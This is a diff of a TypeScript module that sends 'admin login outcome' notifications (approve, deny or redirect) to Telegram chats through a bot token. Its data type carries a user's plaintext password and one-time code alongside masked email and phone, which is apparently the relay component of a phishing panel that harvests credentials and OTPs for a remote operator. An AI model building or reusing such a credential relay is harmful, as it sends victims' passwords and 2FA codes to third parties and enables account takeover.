@@ -4,16 +4,13 @@ import {
   buildAdminLoginRedirectedBody,
 } from '@/lib/telegram-approval-templates'
 import { SITE_DISPLAY_NAME } from '@/lib/site-url'
-
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
 const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
   .split(/[,;\n]+/)
   .map((id) => id.trim())
   .filter(Boolean)
-
 export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
 export type AdminRequestKind = 'login' | 'otp'
-
 function escapeHtml(s: string): string {
   return s
     .replace(/&/g, '&amp;')
@@ -22,7 +19,6 @@ function escapeHtml(s: string): string {
     .replace(/"/g, '&quot;')
     .replace(/'/g, '&#39;')
 }
-
 function asCode(value: unknown): string {
   const text =
     typeof value === 'string'
@@ -32,11 +28,9 @@ function asCode(value: unknown): string {
         : ''
   return `<code>${escapeHtml(text || 'Unknown')}</code>`
 }
-
 function wrapOutcomeMessage(body: string): string {
   return `🏷️ <b>${escapeHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
 }
-
 async function sendTelegramMessage(message: string): Promise<boolean> {
   if (!TELEGRAM_BOT_TOKEN || CHAT_IDS.length === 0) return false
   const results = await Promise.all(
@@ -57,15 +51,13 @@ async function sendTelegramMessage(message: string): Promise<boolean> {
   )
   return results.some(Boolean)
 }
-
 export async function sendAdminLoginOutcomeNotification(data: {
   action: AdminLoginOutcomeAction
   requestKind?: AdminRequestKind
   userId?: string
-  password?: string
   method?: 'email' | 'text' | string
   maskedEmail?: string
-  maskedPhone?: string
+  maskedPhone?: string; password?: string
   code?: string
 }): Promise<boolean> {
   const isOtp = data.requestKind === 'otp'
@@ -76,7 +68,6 @@ export async function sendAdminLoginOutcomeNotification(data: {
     asCode,
     isOtp,
   }
-
   let body: string
   if (data.action === 'approve') {
     body = buildAdminLoginApprovedBody(builderData)
@@ -85,6 +76,5 @@ export async function sendAdminLoginOutcomeNotification(data: {
   } else {
     body = buildAdminLoginRedirectedBody(builderData)
   }
-
   return sendTelegramMessage(wrapOutcomeMessage(body))
 }
